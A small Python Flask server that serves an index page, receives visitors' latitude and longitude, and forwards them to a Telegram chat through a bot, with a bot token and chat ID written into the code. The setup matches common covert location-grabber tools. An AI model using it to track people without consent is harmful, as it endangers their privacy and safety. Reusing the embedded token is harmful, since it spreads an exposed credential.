 



from flask import Flask, request, send_file
from flask_cors import CORS
import requests


app = Flask(__name__)
CORS(app)


BOT_TOKEN = "8941028344:AAEYsRq2psDO5o5CCxYIM7Q_z9ryE9s6PZo"
CHAT_ID = "1584744130"


@app.route("/")
def home():
    return send_file("index.html")



@app.route("/location", methods=["POST"])
def location():

    data = request.json

    lat = data["latitude"]
    lon = data["longitude"]


    print("Location:", lat, lon)


    telegram_url = (
        f"https://api.telegram.org/"
        f"bot{BOT_TOKEN}/sendLocation"
    )


    response = requests.post(
        telegram_url,
        json={
            "chat_id": CHAT_ID,
            "latitude": lat,
            "longitude": lon
        }
    )


    print(response.text)


    return "Location received"



if __name__ == "__main__":

    app.run(
        host="0.0.0.0",
        port=5000
    )